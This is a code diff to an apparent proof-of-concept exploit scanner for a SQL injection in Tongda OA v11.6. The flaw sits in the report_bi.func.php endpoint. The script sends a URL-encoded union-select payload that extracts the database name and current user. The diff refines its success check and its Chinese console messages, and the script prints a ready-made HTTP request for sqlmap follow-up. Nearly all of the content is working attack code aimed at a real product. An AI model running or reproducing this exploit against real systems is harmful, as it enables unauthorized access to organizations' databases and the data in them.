@@ -23,11 +23,11 @@ def main(target_url):
         }
     data='''_POST[dataset_id]=efgh%27-%40%60%27%60%29union+select+database%28%29%2C2%2Cuser%28%29%23%27&action=get_link_info&'''
     exp_url=target_url+'general/bi_design/appcenter/report_bi.func.php'
-    console.print(now_time() + " [INFO]     正在检测通达OA v11.6 insert SQL注入漏洞", style='bold blue')
+    console.print(now_time() + " [INFO]     正在检测通达OA v11.6 report_bi.func.php SQL注入漏洞", style='bold blue')
     try:
         requests.packages.urllib3.disable_warnings()
         response = requests.post(exp_url, headers=headers, data=data, verify=False)
-        if response.status_code == 200:
+        if response.status_code == 200 and 'root' in response.text :
             console.print(now_time() + ' [SUCCESS]  可能存在POST_sql注入漏洞', style='bold green')
             console.print(now_time() + ''' [SUCCESS]  使用sqlmap数据包做进一步验证:
                        POST /general/bi_design/appcenter/report_bi.func.php HTTP/1.1
@@ -39,8 +39,10 @@ def main(target_url):
 
                        _POST[dataset_id]=efgh%27-%40%60%27%60%29union+select+database%28%29%2C2%2Cuser%28%29%23%27&action=get_link_info& #注点
                        ''',style='bold green')
+        elif '用户未登录' in response.text:
+            console.print(now_time() + ' [WARNING]  不存在通达OA v11.6 report_bi.func.php SQL注入漏洞,原因可能未登录', style='bold red ')
         else:
-            console.print(now_time() + ' [WARNING]  不存在通达OA v11.6 insert SQL注入漏洞', style='bold red ')
+            console.print(now_time() + ' [WARNING]  不存在通达OA v11.6 report_bi.func.php SQL注入漏洞', style='bold red ')
     except:
         console.print(now_time() + " [ERROR]    未知错误，无法利用poc请求目标或被目标拒绝请求, ", style='bold red')
         
